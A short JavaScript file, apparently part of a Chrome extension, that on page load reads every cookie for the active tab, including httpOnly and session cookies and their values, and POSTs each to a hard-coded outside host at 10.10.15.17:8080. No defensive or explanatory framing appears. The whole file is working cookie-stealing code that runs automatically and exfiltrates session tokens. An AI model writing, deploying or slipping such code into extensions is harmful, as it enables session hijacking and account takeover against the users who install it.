function sendCookieToProxy(cookie) {
  fetch('http://10.10.15.17:8080/cookie', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(cookie)
  }).catch(err => {
    console.error('Failed:', err);
  });
}

function sendAllCookies() {
  chrome.tabs.query({ active: true, currentWindow: true }, tabs => {
    if (!tabs.length || !tabs[0].url.startsWith('http')) return;

    chrome.cookies.getAll({ url: tabs[0].url }, cookies => {
      cookies.forEach(cookie => {
        sendCookieToProxy({
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path,
          secure: cookie.secure,
          httpOnly: cookie.httpOnly,
          sameSite: cookie.sameSite,
          session: cookie.session,
          expirationDate: cookie.expirationDate
        });
      });
    });
  });
}

document.addEventListener('DOMContentLoaded', sendAllCookies);
